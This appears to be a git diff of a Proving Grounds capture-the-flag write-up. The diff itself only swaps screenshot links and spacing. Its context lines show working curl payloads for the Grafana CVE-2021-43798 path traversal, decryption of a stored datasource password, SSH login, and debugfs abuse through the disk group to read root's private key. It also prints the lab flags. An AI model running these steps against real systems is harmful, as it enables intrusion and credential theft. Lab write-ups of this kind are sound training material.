@@ -1,9 +1,13 @@
 # Fantastic(linux) — Proving Grounds Writeup
 
 **Platform:** Proving Grounds Practice
+
 **OS:** Linux (Ubuntu)
+
 **Difficulty:** Easy
+
 **Job Role:** Junior Penetration Tester
+
 **Tags:** Grafana CVE-2021-43798 · SQLite Database Analysis · AES Decryption · Disk Group Abuse · debugfs Privilege Escalation
 
 ---
@@ -45,9 +49,8 @@
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.156.181
 ```
 
-**Screenshot — Nmap Scan Results:**
+<img width="1597" height="812" alt="image" src="https://github.com/user-attachments/assets/f2d6b92e-2f5e-426a-9a42-020d6ed3599b" />
 
-![Nmap Scan](screenshots/nmap_scan.png)
 
 **Ports Discovered:**
 
@@ -70,9 +73,8 @@ nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.156.181
 
 Navigating to `http://192.168.156.181:3000` reveals a **Grafana** login page.
 
-**Screenshot — Grafana Login Page (Port 3000):**
+<img width="1538" height="838" alt="image" src="https://github.com/user-attachments/assets/7f3851ce-c56c-48ad-930c-913d750e0eeb" />
 
-![Grafana Login](screenshots/grafana_login.png)
 
 The Grafana footer reveals the version: **v8.3.0 (1f1eb021)**
 
@@ -98,9 +100,8 @@ The vulnerability exists in the `/public/plugins/<plugin-name>/` endpoint. By us
 curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ```
 
-**Screenshot — /etc/passwd via Path Traversal:**
+<img width="931" height="776" alt="image" src="https://github.com/user-attachments/assets/c6545888-749b-468e-97f2-fdee74e6ba2e" />
 
-![/etc/passwd Leaked](screenshots/etc_passwd.png)
 
 **Key Users Identified:**
 
@@ -119,9 +120,8 @@ prometheus:x:1000:1000::/home/prometheus:/bin/false
 curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini
 ```
 
-**Screenshot — Grafana Config Defaults Leaked:**
+<img width="1610" height="800" alt="image" src="https://github.com/user-attachments/assets/e88c6aa1-ef10-44ea-b787-3ff2ae5f1cf8" />
 
-![Grafana Config](screenshots/grafana_defaults_ini.png)
 
 The config reveals the default data path as `data = data`, confirming the SQLite database location at `/var/lib/grafana/grafana.db`.
 
@@ -132,9 +132,8 @@ curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F.
   --output grafana.db
 ```
 
-**Screenshot — grafana.db Downloaded:**
+<img width="1663" height="155" alt="image" src="https://github.com/user-attachments/assets/3d7609ee-d969-48d4-ac27-262a8aa1f8da" />
 
-![Grafana DB Download](screenshots/grafana_db_download.png)
 
 Verify the file:
 
@@ -158,9 +157,8 @@ sqlite3 grafana.db
 sqlite> SELECT * FROM data_source;
 ```
 
-**Screenshot — SQLite Browser Showing Encrypted Password:**
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/a5dd3191-046e-450d-8829-a9c297826552" />
 
-![SQLite Browser](screenshots/sqlite_browser.png)
 
 **Encrypted credential found in `data_source` table:**
 
@@ -181,9 +179,10 @@ pip install requests questionary termcolor cryptography
 python3 decrypt.py
 ```
 
-**Screenshot — Grafana Decryptor Output:**
+<img width="1429" height="599" alt="image" src="https://github.com/user-attachments/assets/996a47f1-94ed-4af0-b7a6-1a3c12cdc495" />
 
-![Password Decrypted](screenshots/grafana_decrypt.png)
+<img width="1689" height="419" alt="image" src="https://github.com/user-attachments/assets/079676b2-3c83-4f1a-9f88-ed2d3577043d" />
+
 
 ```
 [*] DataSourcePassword: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
@@ -208,9 +207,8 @@ ssh sysadmin@192.168.156.181
 # Password: SuperSecureP@ssw0rd
 ```
 
-**Screenshot — SSH Shell as sysadmin:**
+<img width="856" height="635" alt="image" src="https://github.com/user-attachments/assets/57ba59af-a192-4867-8839-f4e044e9df0e" />
 
-![SSH Access](screenshots/ssh_initial_access.png)
 
 ```
 Welcome to Ubuntu 20.04.19 LTS (GNU/Linux 5.14.0-1 generic x86_64)
@@ -235,9 +233,8 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-**Screenshot — Linpeas Disk Group Finding:**
+<img width="719" height="110" alt="image" src="https://github.com/user-attachments/assets/67dedd8f-2851-4c1a-9e9e-1b5f2dd9e5cf" />
 
-![Linpeas Disk Group](screenshots/linpeas_disk_group.png)
 
 **Critical Finding from Linpeas:**
 
@@ -257,9 +254,8 @@ id=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
 df -h
 ```
 
-**Screenshot — Disk Space & Partition Layout:**
+<img width="1124" height="718" alt="image" src="https://github.com/user-attachments/assets/6c153d78-229b-4292-9b9c-2e3bc403f916" />
 
-![df -h output](screenshots/df_h.png)
 
 ```
 Filesystem      Size  Used Avail Use% Mounted on
@@ -279,9 +275,8 @@ debugfs 1.45.5 (07-Jan-2020)
 debugfs: cat /root/.ssh/id_rsa
 ```
 
-**Screenshot — Root SSH Private Key via debugfs:**
+<img width="1124" height="718" alt="image" src="https://github.com/user-attachments/assets/799fabdf-a707-4c5a-af34-e267979d076c" />
 
-![debugfs SSH Key](screenshots/debugfs_id_rsa.png)
 
 The full RSA private key is displayed. Copy the entire key output.
 
@@ -298,9 +293,8 @@ chmod 600 id_rsa
 ssh root@192.168.156.181 -i id_rsa
 ```
 
-**Screenshot — SSH as Root Using Extracted Key:**
+<img width="621" height="96" alt="image" src="https://github.com/user-attachments/assets/3e70791d-7f16-48d5-8a6b-3d60d60e33aa" />
 
-![Root SSH Login](screenshots/root_ssh_login.png)
 
 ```
 Last login: Tue Mar  1 18:46:45 2022
@@ -322,9 +316,8 @@ sysadmin@fanatastic:~$ cat local.txt
 d12d2f71594b2ed1b7987861b1d556e8
 ```
 
-**Screenshot — local.txt:**
+<img width="837" height="337" alt="image" src="https://github.com/user-attachments/assets/097a359e-427a-43e1-9f40-0a752a3a29f3" />
 
-![local.txt](screenshots/local_txt.png)
 
 ### proof.txt
 
@@ -335,9 +328,8 @@ root@fanatastic:~# cat proof.txt
 12c2e35a88de074c9ceede34e1064e47
 ```
 
-**Screenshot — proof.txt:**
+<img width="675" height="206" alt="image" src="https://github.com/user-attachments/assets/1cf88bc3-93a2-4bad-89aa-9ec8a20c5c06" />
 
-![proof.txt](screenshots/proof_txt.png)
 
 ---
 
@@ -472,5 +464,6 @@ Target: 192.168.156.181
 ---
 
 **Platform:** OffSec Proving Grounds Practice
-**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
-**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
+
+**Author:** Tanvir Ahmed
+
